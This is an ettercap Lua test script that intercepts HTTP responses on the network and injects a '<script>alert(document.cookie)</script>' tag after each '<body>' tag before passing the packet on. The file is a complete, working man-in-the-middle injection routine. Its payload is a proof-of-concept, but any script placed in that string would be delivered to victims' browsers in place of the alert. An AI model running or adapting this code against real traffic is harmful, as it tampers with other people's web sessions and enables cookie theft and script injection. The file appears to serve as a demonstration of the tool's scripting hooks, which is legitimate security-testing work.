description = "This is a test script that will inject HTTP stuff";

packet = require("packet")
hook_points = require("hook_points")

-- Defines our hook point as being TCP
hook_point = hook_points.tcp

function split_http(str)
  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
  return start,finish,header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end


-- Here's your match rule.
match_rule = function(po)
  return(packet.read_data(po, 7) == "HTTP/1.")
end

-- Here's your action.
action = function(po) 
  --ettercap.log("inject_http action : called!\n")
  -- Get the full buffer....
  local buf = packet.read_data(po)
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
    -- We've tweaked things, so let's update the data.
    if (not(modified_body == body)) then
      ettercap.log("inject_http action : We modified the HTTP response!\n")
      local modified_data = header .. modified_body

      -- This takes care of setting the packet data, as well as flagging it 
      -- as modified.
      packet.set_data(po, modified_data)
    end
  end
end
